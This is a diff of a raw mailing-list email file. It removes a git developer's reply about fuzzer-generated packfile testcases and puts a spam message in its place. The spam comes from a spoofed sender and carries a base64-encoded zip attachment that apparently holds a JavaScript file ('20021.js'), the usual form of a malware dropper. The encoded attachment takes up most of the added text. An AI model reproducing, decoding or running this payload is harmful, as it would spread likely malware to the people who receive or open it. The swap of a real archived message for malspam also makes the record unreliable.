@@ -1,112 +1,130 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: *
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.9 required=3.0 tests=AWL,BAYES_00,
-	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD
-	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=1.3 required=3.0 tests=BAYES_50,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=no autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 2C174201C2
-	for <e@80x24.org>; Mon, 13 Mar 2017 11:07:54 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 61470201C2
+	for <e@80x24.org>; Mon, 13 Mar 2017 11:13:09 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1752127AbdCMLHs (ORCPT <rfc822;e@80x24.org>);
-        Mon, 13 Mar 2017 07:07:48 -0400
-Received: from aserp1040.oracle.com ([141.146.126.69]:16887 "EHLO
-        aserp1040.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750914AbdCMLHq (ORCPT <rfc822;git@vger.kernel.org>);
-        Mon, 13 Mar 2017 07:07:46 -0400
-Received: from aserv0022.oracle.com (aserv0022.oracle.com [141.146.126.234])
-        by aserp1040.oracle.com (Sentrion-MTA-4.3.2/Sentrion-MTA-4.3.2) with ESMTP id v2DB7bce016480
-        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-        Mon, 13 Mar 2017 11:07:37 GMT
-Received: from userv0122.oracle.com (userv0122.oracle.com [156.151.31.75])
-        by aserv0022.oracle.com (8.14.4/8.14.4) with ESMTP id v2DB7aoq023173
-        (version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-        Mon, 13 Mar 2017 11:07:37 GMT
-Received: from abhmp0006.oracle.com (abhmp0006.oracle.com [141.146.116.12])
-        by userv0122.oracle.com (8.14.4/8.14.4) with ESMTP id v2DB7Zqh004630;
-        Mon, 13 Mar 2017 11:07:35 GMT
-Received: from [10.175.235.212] (/10.175.235.212)
-        by default (Oracle Beehive Gateway v4.0)
-        with ESMTP ; Mon, 13 Mar 2017 04:07:35 -0700
-Subject: Re: [RFC][PATCH] index-pack: add testcases found using AFL
-To:     Junio C Hamano <gitster@pobox.com>, Jeff King <peff@peff.net>
-References: <20170310151556.18490-1-vegard.nossum@oracle.com>
- <20170310190641.i7geazhrlmzzfna6@sigill.intra.peff.net>
- <CACBZZX5fGU9C-z94KbMAs_AegOSGtq8nbrkRe-NxBCHYsDswkA@mail.gmail.com>
- <20170312123212.3rnqyx3dvi5yppk5@sigill.intra.peff.net>
- <xmqq7f3uuzuu.fsf@gitster.mtv.corp.google.com>
-Cc:     =?UTF-8?B?w4Z2YXIgQXJuZmrDtnLDsCBCamFybWFzb24=?= <avarab@gmail.com>,
-        Git Mailing List <git@vger.kernel.org>
-From:   Vegard Nossum <vegard.nossum@oracle.com>
-Message-ID: <ee3f01f0-2dc1-f919-223c-dad6032fa396@oracle.com>
-Date:   Mon, 13 Mar 2017 12:07:32 +0100
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
- Thunderbird/45.7.0
+        id S1752851AbdCMLNI (ORCPT <rfc822;e@80x24.org>);
+        Mon, 13 Mar 2017 07:13:08 -0400
+Received: from ws154.zone31-163-188.zaural.ru ([31.163.188.154]:44305 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752838AbdCMLNE (ORCPT <rfc822;git@vger.kernel.org>);
+        Mon, 13 Mar 2017 07:13:04 -0400
+X-Greylist: delayed 310 seconds by postgrey-1.27 at vger.kernel.org; Mon, 13 Mar 2017 07:13:03 EDT
+Date:   Mon, 13 Mar 2017 11:12:49 -0000
+Message-ID: <148940356971.30107.13314617873218753416@zaural.ru>
 MIME-Version: 1.0
-In-Reply-To: <xmqq7f3uuzuu.fsf@gitster.mtv.corp.google.com>
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 7bit
-X-Source-IP: aserv0022.oracle.com [141.146.126.234]
+To:     "git" <git@vger.kernel.org>
+Content-Type: application/zip; name="498.zip"
+From:   <alison_fitzsimmons@sd33.bc.ca>
+Content-Transfer-Encoding: base64
+Reply-To: <alison_fitzsimmons@sd33.bc.ca>
+Subject: 63146 git
+Importance: High
+Content-Disposition: attachment
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On 12/03/2017 19:14, Junio C Hamano wrote:
-> Jeff King <peff@peff.net> writes:
->
->> One further devil's advocate:
->>
->> If people really _do_ care about coverage, arguably the AFL tests are a
->> pollution of that concept. Because they are running the code, but doing
->> a very perfunctory job of testing it. IOW, our coverage of "code that
->> doesn't segfault or trigger ASAN" is improved, but our coverage of "code
->> that has been tested to be correct" is not (and since the tests are
->> lumped together, it's hard to get anything but one number).
->>
->> So I dunno. I remain on the fence about the patch.
->
-> Yeah, I have been disturbed by your earlier remark "binary test
-> cases that nobody, not even the author, understands", and the above
-> summarizes it more clearly.
->
-> Continuously running fuzzer tests on the codebase would have value,
-> but how exactly are these fuzzballs generated?  Don't they depend on
-> the code being tested?  IOW, how effective is a set of fuzzballs
-> that forces the code to take more branches in the current codepath
-> for the purpose of testing new code that updates the codepath,
-> changing the structure of the codeflow?  Unless a new set of
-> fuzzballs to match the updated codeflow is generated, wouldn't the
-> test coverage with these fuzzballs erode over time, making them less
-> and less useful baggage we carry around, without nobody noticing that
-> they no longer are effective to help test coverage?
-
-Yes, the testcases are generated based on the feedback from the
-instrumented code, so they are very clearly shaped by the code itself.
-
-However, I think it's more useful to think of these testcases not as
-"binary test that nobody knows what they are doing", but as "(sometimes
-invalid) packfiles which tickle interesting code paths in the packfile
-parser".
-
-With this perspective it becomes clearer that while they were generated
-from the code, they also in a sense describe the packfile format itself.
-
-I did a few experiments in changing the code of the packfile reader in
-various small ways (e.g. deleting a check, reordering some code) to see
-the effects of the testcases found by fuzzing, and I have to admit it
-was fairly disappointing. The testcases I added did not catch a single
-buggy change, whereas the other testcases did catch many of them.
-
-So I guess you are right -- these testcases are maybe really not that
-useful as part of the test suite without explicit comparison between the
-expected and actual results.
-
-Forget about the patch, I will just put the testcases in a separate repo
-instead. Maybe I will convert some of them into "real" tests.
-
-Thanks, and sorry for the noise.
-
-
-Vegard
+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
+UwAAAMgUAAAAAA==
